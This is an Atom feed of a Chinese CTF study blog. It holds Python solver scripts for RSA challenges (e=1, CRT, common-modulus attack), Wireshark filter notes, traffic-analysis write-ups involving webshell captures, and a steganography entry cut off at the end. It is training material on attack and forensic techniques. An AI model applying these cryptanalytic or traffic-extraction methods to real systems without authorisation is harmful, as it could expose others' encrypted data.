<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HappyCoder&#39;Home</title>
  
  
  <link href="https://zhangkaibin0921.github.io/atom.xml" rel="self"/>
  
  <link href="https://zhangkaibin0921.github.io/"/>
  <updated>2022-01-17T07:59:22.065Z</updated>
  <id>https://zhangkaibin0921.github.io/</id>
  
  <author>
    <name>zhangkaibin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RSA小学生刷题</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/15/RSA%E5%B0%8F%E5%AD%A6%E7%94%9F%E5%88%B7%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/15/RSA%E5%B0%8F%E5%AD%A6%E7%94%9F%E5%88%B7%E9%A2%98/</id>
    <published>2022-01-15T03:50:22.000Z</published>
    <updated>2022-01-17T07:59:22.065Z</updated>
    
    <content type="html"><![CDATA[<h2 id="风二西RSA-1"><a href="#风二西RSA-1" class="headerlink" title="风二西RSA_1"></a>风二西RSA_1</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import gmpy2<br>import libnum<br>import uuid<br>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>+str(uuid<span class="hljs-selector-class">.uuid4</span>())+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br>m=libnum<span class="hljs-selector-class">.s2n</span>(flag)<br>p=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">512</span>)<br>q=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">512</span>)<br>n=p*<span class="hljs-selector-tag">q</span><br>e=<span class="hljs-number">1</span><br>c=pow(m,e,n)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;n=&quot;</span>,n)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;c=&quot;</span>,c)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;e=&quot;</span>,e)</span></span><br>n= 已给出太长我省略了<br>c= 已给出太长我省略了<br><br></code></pre></td></tr></table></figure><p>直接print(long_to_bytes(c))即可<br>因为long_to_bytes之后前面会多出<font color=red>‘b</font>，就像下面这样</p>    <figure class="figure-image">      <img src="/picture/c4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">e</span>=1<br>n =<br>c =<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10000000000000000):<br>    <span class="hljs-attribute">x</span>=str(long_to_bytes(c+n*i))<br>    <span class="hljs-keyword">if</span> x[2]==<span class="hljs-string">&#x27;f&#x27;</span>:<br>        <span class="hljs-builtin-name">print</span>(x)<br>        break<br>    <br></code></pre></td></tr></table></figure><hr><h2 id="风二西RSA-2"><a href="#风二西RSA-2" class="headerlink" title="风二西RSA_2"></a>风二西RSA_2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy<span class="hljs-number">2</span><br><span class="hljs-attribute">import</span> libnum<br><span class="hljs-attribute">import</span> uuid<br><span class="hljs-attribute">flag</span>=<span class="hljs-string">&quot;flag&#123;&quot;</span>+str(uuid.uuid<span class="hljs-number">4</span>())+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-attribute">print</span>(flag)<br><span class="hljs-attribute">m</span>=libnum.s<span class="hljs-number">2</span>n(flag)<br><span class="hljs-attribute">p1</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q1</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">p2</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q2</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">p3</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q3</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">e</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">c1</span>=pow(m,e,p<span class="hljs-number">1</span>*q<span class="hljs-number">1</span>)<br><span class="hljs-attribute">c2</span>=pow(m,e,p<span class="hljs-number">2</span>*q<span class="hljs-number">2</span>)<br><span class="hljs-attribute">c3</span>=pow(m,e,p<span class="hljs-number">3</span>*q<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n1=&quot;</span>,p<span class="hljs-number">1</span>*q<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c1=&quot;</span>,c<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n2=&quot;</span>,p<span class="hljs-number">2</span>*q<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c2=&quot;</span>,c<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n3=&quot;</span>,p<span class="hljs-number">3</span>*q<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c3=&quot;</span>,c<span class="hljs-number">3</span>)<br><span class="hljs-attribute">n1</span>= <span class="hljs-number">172774622114813683746188230007837413819</span><br><span class="hljs-attribute">c1</span>= <span class="hljs-number">170260248491697016437095929037490480036</span><br><span class="hljs-attribute">n2</span>= <span class="hljs-number">160333927436069409658483084503168246581</span><br><span class="hljs-attribute">c2</span>= <span class="hljs-number">45134242975344810542214361639231372051</span><br><span class="hljs-attribute">n3</span>= <span class="hljs-number">170109598387116572557100744899522621873</span><br><span class="hljs-attribute">c3</span>= <span class="hljs-number">47903985600747367026642413789127948969</span><br><br></code></pre></td></tr></table></figure><p>m=c1 % n1<br>m=c2 % n2<br>m=c3 % n3<br>又n1、n2、n3两两互素，中国剩余定理（不知道有没有可以直接计算中国剩余定理的函数，我没有找到）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">172774622114813683746188230007837413819</span><br>c1 = <span class="hljs-number">170260248491697016437095929037490480036</span><br>n2 = <span class="hljs-number">160333927436069409658483084503168246581</span><br>c2 = <span class="hljs-number">45134242975344810542214361639231372051</span><br>n3 = <span class="hljs-number">170109598387116572557100744899522621873</span><br>c3 = <span class="hljs-number">47903985600747367026642413789127948969</span><br><span class="hljs-built_in">print</span>(gcd(n1,n2),gcd(n1,n3),gcd(n2,n3))<br>M1=n2*n3<br>M11=invert(M1,n1)<br>M2=n1*n3<br>M21=invert(M2,n2)<br>M3=n1*n2<br>M31=invert(M3,n3)<br>m=(c1*M1*M11+c2*M2*M21+c3*M3*M31)%(n1*n2*n3)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><hr><h2 id="风二西RSA-3"><a href="#风二西RSA-3" class="headerlink" title="风二西RSA_3"></a>风二西RSA_3</h2><p>这一题原理在同模攻击那里说过了，这一题也是同模攻击那一篇的例子</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import libnum<br>import gmpy2<br>import uuid<br>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>+str(uuid<span class="hljs-selector-class">.uuid4</span>())+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br>m=libnum<span class="hljs-selector-class">.s2n</span>(flag)<br>p=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">1024</span>)<br>q=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">1024</span>)<br>n1=p*<span class="hljs-selector-tag">q</span><br>n2=p*<span class="hljs-selector-tag">q</span><br>e1=<span class="hljs-number">2333</span><br>e2=<span class="hljs-number">23333</span><br>m=libnum<span class="hljs-selector-class">.s2n</span>(flag)<br>c1=pow(m,e1,n1)<br>c2=pow(m,e2,n2)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;n1=&quot;</span>,n1)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;n2=&quot;</span>,n2)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;e1=&quot;</span>,e1)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;e2=&quot;</span>,e2)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;c1=&quot;</span>,c1)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;c2=&quot;</span>,c2)</span></span><br>n1= 已给出太长我省略了<br>n2= 已给出太长我省略了<br>e1= <span class="hljs-number">2333</span><br>e2= <span class="hljs-number">23333</span><br>c1= 已给出太长我省略了<br>c2= 已给出太长我省略了<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy<span class="hljs-number">2</span><br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-comment">#数字n、c1、c2都太长了，我直接去了</span><br><span class="hljs-attribute">n</span>=<br><span class="hljs-attribute">e1</span>= <span class="hljs-number">2333</span><br><span class="hljs-attribute">e2</span>= <span class="hljs-number">23333</span><br><span class="hljs-attribute">c1</span>=<br><span class="hljs-attribute">c2</span>=<br><span class="hljs-attribute">gcd</span>, s, t = gmpy<span class="hljs-number">2</span>.gcdext(e<span class="hljs-number">1</span>, e<span class="hljs-number">2</span>)<br><span class="hljs-comment">#广义欧几里得求出s,t  gcdext返回值为e1,e2最大公因数和s、t。 s*e1+t*e2=(e1,e2)</span><br><br><span class="hljs-comment">#s和t中必然有一位负数，将其变为正数，要使等式仍然成立，取逆元</span><br><span class="hljs-attribute">if</span> s &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-attribute">s</span> = -s<br>    <span class="hljs-attribute">c1</span> = gmpy<span class="hljs-number">2</span>.invert(c<span class="hljs-number">1</span>, n)<br><span class="hljs-attribute">if</span> t &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-attribute">t</span> = -t<br>    <span class="hljs-attribute">c2</span> = gmpy<span class="hljs-number">2</span>.invert(c<span class="hljs-number">2</span>, n)<br><span class="hljs-attribute">plain</span> = gmpy<span class="hljs-number">2</span>.powmod(c<span class="hljs-number">1</span>, s, n) * gmpy<span class="hljs-number">2</span>.powmod(c<span class="hljs-number">2</span>, t, n) % n<br><span class="hljs-attribute">print</span>(long_to_bytes(plain))<br><span class="hljs-comment">#将long转换成字符串，是Crypto.Util.number中的方法，这里用不了libnum.n2s(plain)因为plain太长了</span><br></code></pre></td></tr></table></figure><hr><h2 id="风二西RSA-4"><a href="#风二西RSA-4" class="headerlink" title="风二西RSA_4"></a>风二西RSA_4</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs processing">from Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Pubckey.pem&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) as f:<br>    <span class="hljs-built_in">key</span>=RSA.import_key(f.read())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=%d&#x27;</span> % <span class="hljs-built_in">key</span>.n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=%d&#x27;</span> % <span class="hljs-built_in">key</span>.e)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d=%d&#x27;</span> % <span class="hljs-built_in">key</span>.d)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=%d&#x27;</span> % <span class="hljs-built_in">key</span>.p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=%d&#x27;</span> % <span class="hljs-built_in">key</span>.q)<br>    <br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.pem&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>+<span class="hljs-built_in">str</span>(libnum.s2n(f1.read())))<br>n=<br>e=<span class="hljs-number">65537</span><br>d=<br>p=<br>q=<br>c=<br>m=<span class="hljs-built_in">pow</span>(c,d,n)  #注意这个m不是<span class="hljs-built_in">int</span>型的！！<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;风二西RSA-1&quot;&gt;&lt;a href=&quot;#风二西RSA-1&quot; class=&quot;headerlink&quot; title=&quot;风二西RSA_1&quot;&gt;&lt;/a&gt;风二西RSA_1&lt;/h2&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>http请求和响应、TCP网络五层架构</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/</id>
    <published>2022-01-14T01:23:09.000Z</published>
    <updated>2022-01-17T08:02:10.785Z</updated>
    
    <content type="html"><![CDATA[<div class="aplayer-box" data-url='/picture/赵英俊 - 送你一朵小红花.mp3' data-name='送你一朵小红花' data-artist='赵英俊' data-cover='/picture/flower.png' ></div><h2 id="HTTP基础知识"><a href="#HTTP基础知识" class="headerlink" title="HTTP基础知识"></a>HTTP基础知识</h2><p>http协议的特点:<br>基于tcp/ip协议<br>默认端口号为80<br>请求与响应一一对应<br>每次请求相互独立，是无状态协议(这也是为什么需要cookie)</p><p>HTTP常用有八种请求方式，常用get和post<br>get请求：请求参数在url地址中，url有长度限制；<font color=red>get方式只能传输字符型的数据</font><br>post请求：请求参数在请求体中，无大小限制；<font color=red>post方式能传输字符和字节型数据</font>(当你想要上传一张图片或音乐必须使用post方式)</p><p>响应状态码：服务器告诉浏览器本次请求和响应的状态<br>1×× ：服务器接收浏览器消息未完成，发送1××状态码<br>2×× ：成功，200<br>3×× ：重定向，302，,304<br>4×× ：客户端错误，404(没有找到对应资源)，405(请求方法不被允许)<br>5×× ：服务器错误，500(服务器内部出现异常)</p><h2 id="TCP网络五层架构"><a href="#TCP网络五层架构" class="headerlink" title="TCP网络五层架构"></a>TCP网络五层架构</h2>    <figure class="figure-image">      <img src="/picture/web2.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>分层好处：<br>1、各层独立：限制了依赖关系的范围，各层之间使用标准化的接口，各层不需要知道上下层是如何工作的，增加或者修改一个应用层协议不会影响传输层协议<br>2、灵活性更好：比如路由器不需要应用层和传输层，分层后路由器就可以只用加载更少的几个协议层<br>3、易于测试和维护：提高了可测试性，可以独立的测试特定层，某一层有了更好的实现可以整体替换掉<br>4、能促进标准化：每一层之策清楚，方便标准化</p>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;aplayer-box&quot; data-url=&#39;/picture/赵英俊 - 送你一朵小红花.mp3&#39; data-name=&#39;送你一朵小红花&#39; data-artist=&#39;赵英俊&#39; data-cover=&#39;/picture/flower.png&#39; &gt;&lt;/div</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界流量分析题</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98/</id>
    <published>2022-01-13T09:20:39.000Z</published>
    <updated>2022-01-17T08:02:18.581Z</updated>
    
    <content type="html"><![CDATA[<div class="aplayer-box" data-url='/picture/赵英俊 - 送你一朵小红花.mp3' data-name='送你一朵小红花' data-artist='赵英俊' data-cover='/picture/flower.png' ></div><h2 id="1、功夫再高也怕菜刀"><a href="#1、功夫再高也怕菜刀" class="headerlink" title="1、功夫再高也怕菜刀"></a>1、功夫再高也怕菜刀</h2>    <figure class="figure-image">      <img src="/picture/misc31.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc32.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>开始追踪流</p>    <figure class="figure-image">      <img src="/picture/misc33.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>flag.txt找了半天没找到到底要怎么才能获取<br>直接导出http对象</p>    <figure class="figure-image">      <img src="/picture/misc34.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>1(22).php很大，打开看一下</p>    <figure class="figure-image">      <img src="/picture/misc35.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc36.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>看到了这个png的文件头，把从文件头开始到文件末尾复制到一个新的txt文本，导入到010editor中，再导出为png</p>    <figure class="figure-image">      <img src="/picture/misc37.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>我以为这就是flag了，没想到不是，看别人的wp，知道pacp下面还有一个压缩包<br><font color=red>用binwalk分离不行，会得到很多东西，必须使用foremost分离</font>，得到一个压缩包，密码就是刚才得到的图片，得到flag</p><h2 id="2、wireshark-1"><a href="#2、wireshark-1" class="headerlink" title="2、wireshark-1"></a>2、wireshark-1</h2>    <figure class="figure-image">      <img src="/picture/misc38.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>导出HTTP对象</p>    <figure class="figure-image">      <img src="/picture/misc39.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>题目提示管理员登录网站的密码，所以看后三个和登录有关的文件。我先看了两个较大一点的，都是网站登录页面的html文件，打开第三个，passwd就直接写在里面了</p><h2 id="3、easycap"><a href="#3、easycap" class="headerlink" title="3、easycap"></a>3、easycap</h2>    <figure class="figure-image">      <img src="/picture/misc40.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>打开，追踪流得到FLAG<br>flag是FLAG:385b87afc8671dee07550290d16a8071</p><h1 id="功防世界就在其中反复观看！！！！"><a href="#功防世界就在其中反复观看！！！！" class="headerlink" title="功防世界就在其中反复观看！！！！"></a>功防世界就在其中反复观看！！！！</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;aplayer-box&quot; data-url=&#39;/picture/赵英俊 - 送你一朵小红花.mp3&#39; data-name=&#39;送你一朵小红花&#39; data-artist=&#39;赵英俊&#39; data-cover=&#39;/picture/flower.png&#39; &gt;&lt;/div</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc流量包文件分析</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/13/misc%E6%B5%81%E9%87%8F%E5%8C%85%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/13/misc%E6%B5%81%E9%87%8F%E5%8C%85%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</id>
    <published>2022-01-13T06:12:15.000Z</published>
    <updated>2022-01-17T07:59:58.128Z</updated>
    
    <content type="html"><![CDATA[<div class="aplayer-box" data-url='/picture/赵英俊 - 送你一朵小红花.mp3' data-name='送你一朵小红花' data-artist='赵英俊' data-cover='/picture/flower.png' ></div><h2 id="wireshark过滤器"><a href="#wireshark过滤器" class="headerlink" title="wireshark过滤器"></a>wireshark过滤器</h2><p>1、过滤IP<br>ip.src eq x.x.x.x or ip.dst eq x.x.x.x   或者  ip.addr   eq  x.x.x.x</p><p>2、过滤端口<br>tcp.port eq 80 or udp.port eq 80<br>tcp.dstport == 80  只显tcp协议的目标端口为80<br>tcp.scrport == 80   只显tcp协议的源端口为80<br>tcp.port &gt;=1 and tcp.port&lt;=80   </p><p>3、<font color=red>过滤协议</font><br>tcp/udp/arp/icmp/http/ftp/dns/ip……</p><p>4、包长度过滤<br>一般长度较小的包，可能不会藏太多东西<br>udp.length == 26<br>tcp.len &gt;= 7<br>ip.len == 94<br>frame.len == 119  整个数据包的长度，从eth开始到最后</p><p>5、过滤MAC<br>eth.dst == A0:00:00:04:C5:84 过滤目标mac</p><p>6、<font color=red>http模式过滤</font><br>http.request.method == “GET”<br>http.request.method == “POST”<br>http.request.uri == “/img/logo-edu.gif”<br>http contains “GET”<br>http contains “HTTP/1.”<br>http.request.method == “GET”  &amp;&amp; http contains “User-Agent:”<br><font color=red>http contains “flag”</font><br>http contains “key”<br>tcp contains “flag”<br><font color=red>tcp contains “command”</font><br><font color=red>tcp contains “ls”</font></p><hr><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>1、协议分级<br>[统计]-&gt;[协议分级]</p>    <figure class="figure-image">      <img src="/picture/misc26.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>从协议分级可以看出这个pcap文件里的UDP明显多于TCP，所以就主要分析这个文件的UDP</p><p>2、根据数据包特征进行筛选<br>比如查看数据包时，有的数据包有某些特征，比如有http(80)，就可以筛选这种特征出来<br>[右键]-&gt;[作为过滤器应用]-&gt;[选中]</p>    <figure class="figure-image">      <img src="/picture/misc27.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>3、流汇聚<br>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容</p>    <figure class="figure-image">      <img src="/picture/misc28.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc20.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>常见的HTTP流关键内容:<br>1、HTML中直接包含重要信息<br>2、上传或下载文件内容，通常包含文件名、hash值等关键信息<br>3、一句话木马、POST请求、内容包含eval、内容使用base64加密</p><p><font color=red>4、提取通过http传输的文件内容</font><br>[文件]-&gt;[导出对象]-&gt;[HTTP]</p>    <figure class="figure-image">      <img src="/picture/misc29.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>5、手动提取文件内容<br>点击想要的数据包，选中media type位置(或其他位置)<br>[右键]-&gt;[导出分组字节流]<br>在弹出的框中将文件保存成二进制文件</p><hr><h2 id="无线流量包和USB流量包之类的"><a href="#无线流量包和USB流量包之类的" class="headerlink" title="无线流量包和USB流量包之类的"></a>无线流量包和USB流量包之类的</h2>    <figure class="figure-image">      <img src="/picture/misc45.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc46.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc47.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;aplayer-box&quot; data-url=&#39;/picture/赵英俊 - 送你一朵小红花.mp3&#39; data-name=&#39;送你一朵小红花&#39; data-artist=&#39;赵英俊&#39; data-cover=&#39;/picture/flower.png&#39; &gt;&lt;/div</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界图片隐写题</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%A2%98/</id>
    <published>2022-01-11T10:53:02.000Z</published>
    <updated>2022-01-17T08:00:48.240Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、a-good-idea"><a href="#1、a-good-idea" class="headerlink" title="1、a_good_idea"></a>1、a_good_idea</h2><p>先010editor看，右栏Ascii很容易就看到很多misc，to_do.png之类的，binwalk分离得到压缩包，两张一模一样的图片和一个提示文档对像素进行操作。stegsolve里面，进行combine但是什么都看不出来，两个图片互换位置也都试过了。然后上网看了别人的wp之后才知道XOR之后，把曝光调到最后，得到一张二维码。这个想法，所以我想记录一下。</p>    <figure class="figure-image">      <img src="/picture/misc16.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>[图像]-&gt;[调整]-&gt;[曝光度]</p><h2 id="2、Training-Stegano-1"><a href="#2、Training-Stegano-1" class="headerlink" title="2、Training-Stegano-1"></a>2、Training-Stegano-1</h2><p>拿到图片，丢入010editor</p>    <figure class="figure-image">      <img src="/picture/misc17.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>大道至简，这题的flag就是steganoI，不需要套flag{}，记录这题想告诉我自己不要想太多吧，这题已经说了passwd:  了</p><h2 id="3、pure-color"><a href="#3、pure-color" class="headerlink" title="3、pure_color"></a>3、pure_color</h2><p>首先题目名字color有关，拿到图片是一张纯白得图片，很容易想到LSB</p>    <figure class="figure-image">      <img src="/picture/misc18.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>但是图片看起来只有半截，先爆破了一下宽高，发现没有问题，在试试LSB</p>    <figure class="figure-image">      <img 